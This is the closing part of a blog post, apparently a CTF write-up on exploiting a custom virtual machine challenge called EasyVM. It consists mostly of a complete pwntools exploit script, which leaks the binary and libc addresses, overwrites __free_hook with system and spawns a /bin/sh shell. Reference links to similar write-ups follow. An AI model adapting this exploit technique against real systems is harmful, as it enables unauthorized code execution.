<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">"./EasyVM"</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">produce</span><span class="params">(ins)</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.send(ins)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_one</span><span class="params">(addr)</span>:</span></span><br><span class="line">    ins = <span class="string">'\x80\x03'</span>+p32(addr)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">1</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">2</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">3</span>)+<span class="string">'\x53\x00'</span></span><br><span class="line">    ins += <span class="string">'\x99'</span></span><br><span class="line">    produce(ins)</span><br><span class="line">    start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_one</span><span class="params">(addr,value)</span>:</span></span><br><span class="line">    ins = <span class="string">'\x80\x03'</span>+p32(addr)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">1</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">2</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x03'</span>+p32(addr+<span class="number">3</span>)+<span class="string">'\x54\x00'</span></span><br><span class="line">    ins += <span class="string">'\x80\x00'</span>+<span class="string">'/bin'</span></span><br><span class="line">    ins += <span class="string">'\x80\x01'</span>+<span class="string">'/sh\x00'</span></span><br><span class="line">    ins += <span class="string">'\x99'</span></span><br><span class="line">    produce(ins)</span><br><span class="line">    start()</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gd</span><span class="params">(s = <span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,s)</span><br><span class="line"></span><br><span class="line">gift()</span><br><span class="line">produce(<span class="string">"\x09\x11\x99"</span>)</span><br><span class="line">start()</span><br><span class="line">p.recvline()</span><br><span class="line">binary_base = int(p.recv(<span class="number">10</span>),<span class="number">16</span>) - <span class="number">0x6c0</span></span><br><span class="line">log.success(<span class="string">"binary_base:0x%x"</span>%binary_base)</span><br><span class="line"></span><br><span class="line">malloc_got = binary_base + <span class="number">0x2fcc</span></span><br><span class="line">read_one(malloc_got)</span><br><span class="line">p.recv()</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x70f00</span></span><br><span class="line">log.success(<span class="string">"libc_base:0x%x"</span>%libc_base)</span><br><span class="line">free_hook = libc_base + <span class="number">0x1b38b0</span> </span><br><span class="line">system_addr = libc_base + <span class="number">0x3ada0</span></span><br><span class="line">write_one(free_hook,p32(system_addr))</span><br><span class="line">gd()</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/PDKT-Team/ctf/tree/master/seccon2018/kindvm#bahasa-indonesia" target="_blank" rel="noopener">https://github.com/PDKT-Team/ctf/tree/master/seccon2018/kindvm#bahasa-indonesia</a></p>
<p><a href="https://blog.csdn.net/qq_25201379/article/details/83548147" target="_blank" rel="noopener">https://blog.csdn.net/qq_25201379/article/details/83548147</a></p>
<p><a href="https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/" target="_blank" rel="noopener">https://dittozzz.top/2019/09/28/VM-pwn-%E5%88%9D%E6%8E%A2/</a></p>
<p><a href="https://xz.aliyun.com/t/6865" target="_blank" rel="noopener">https://xz.aliyun.com/t/6865</a></p>
<p><a href="https://www.bilibili.com/read/cv5124780" target="_blank" rel="noopener">https://www.bilibili.com/read/cv5124780</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">kangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章鏈接: </span><span class="post-copyright-info"><a href="https://j-kangel.github.io/2020/04/10/虚拟指令集pwn/">https://j-kangel.github.io/2020/04/10/虚拟指令集pwn/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版權聲明: </span><span class="post-copyright-info">本博客所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 許可協議。轉載請註明來自 <a href="https://j-kangel.github.io" target="_blank">KANGEL</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn    </a><a class="post-meta__tags" href="/tags/gxzy/">gxzy    </a></div><div class="post_share"></div></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/04/16/kernel-pwn-one/"><img class="prev_cover lazyload" data-src="/article_cover/logo.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>kernel pwn(one)</span></div></a></div><div class="next-post pull_right"><a href="/2020/04/10/tcache-stashing-unlink-attack/"><img class="next_cover lazyload" data-src="/article_cover/logo.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>tcache_stashing_unlink_attack</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相關推薦</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/04/16/kernel-pwn-one/" title="kernel pwn(one)"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">kernel pwn(one)</div></a></div><div class="relatedPosts_item"><a href="/2020/04/10/tcache-stashing-unlink-attack/" title="tcache_stashing_unlink_attack"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">tcache_stashing_unlink_attack</div></a></div><div class="relatedPosts_item"><a href="/2020/04/09/gxzyCTF-pwn-lgd/" title="gxzyCTF pwn lgd"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">gxzyCTF pwn lgd</div></a></div><div class="relatedPosts_item"><a href="/2020/03/13/利用-IO-2-1-stdout-泄漏libc/" title="利用_IO_2_1_stdout_泄漏libc"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">利用_IO_2_1_stdout_泄漏libc</div></a></div><div class="relatedPosts_item"><a href="/2020/06/23/pwnable-tw-Spirited-Away/" title="pwnable.tw Spirited Away"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">pwnable.tw Spirited Away</div></a></div><div class="relatedPosts_item"><a href="/2020/06/22/pwnable-tw-babystack/" title="pwnable.tw babystack"><img class="relatedPosts_cover lazyload"data-src="/article_cover/logo.jpg"><div class="relatedPosts_title">pwnable.tw babystack</div></a></div></div><div class="clear_both"></div></div></div></div><footer id="footer" style="background-image: url(/article_cover/logo.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2020 By kangel</div><div class="framework-info"><span>Power by </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://j-kangel.github.io/">blog</a>!</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="閲讀模式"></i><i class="fa fa-plus" id="font_plus" title="放大字體"></i><i class="fa fa-minus" id="font_minus" title="縮小字體"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="簡繁轉換" target="_self">简</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜間模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="設置"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="目錄" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到頂部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.15/dist/snackbar.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script src="/js/tw_cn.js"></script><script>translateInitilization()
</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script></body></html>